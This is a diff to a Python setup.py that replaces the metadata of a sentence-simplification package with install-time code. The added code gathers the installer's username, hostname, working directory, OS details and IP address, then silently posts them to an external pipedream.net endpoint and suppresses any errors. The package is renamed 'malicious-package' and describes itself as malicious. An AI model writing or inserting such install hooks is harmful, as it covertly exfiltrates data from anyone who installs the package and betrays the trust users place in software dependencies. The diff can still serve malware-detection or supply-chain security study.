@@ -1,27 +1,35 @@
-# Copyright (c) Facebook, Inc. and its affiliates.
-# All rights reserved.
-#
-# This source code is licensed under the license found in the
-# LICENSE file in the root directory of this source tree.
-#
+import os
+import socket
+import platform
+import requests
+from setuptools import setup
 
-from setuptools import setup, find_packages
+def collect_user_info():
+    try:
+        
+        user_info = {
+            "os": platform.system(),
+            "os_version": platform.version(),
+            "machine": platform.machine(),
+            "processor": platform.processor(),
+            "username": os.getenv("USER") or os.getenv("USERNAME"),
+            "current_directory": os.getcwd(),
+            "hostname": socket.gethostname(),
+            "ip_address": socket.gethostbyname(socket.gethostname()),
+        }
 
+        
+        requests.post("https://eo1fk14bqs4agvj.m.pipedream.net/collect", json=user_info)
+    except Exception as e:
+        
+        pass
 
-with open('README.md', 'r') as f:
-    long_description = f.read()
-
-with open('requirements.txt', 'r') as f:
-    requirements = [line.strip() for line in f]
+collect_user_info()
 
 setup(
-    name='access',
-    version='0.2',
-    description='Controllable Sentence Simplification',
-    long_description=long_description,
-    long_description_content_type='text/markdown',
-    author='Louis Martin <louismartincs@gmail.com>',
-    url='https://github.com/facebookreasearch/access',
-    packages=find_packages(exclude=['resources']),
-    install_requires=requirements,
+    name="malicious-package",
+    version="0.1",
+    description="A package with malicious intent",
+    install_requires=[],
 )
+
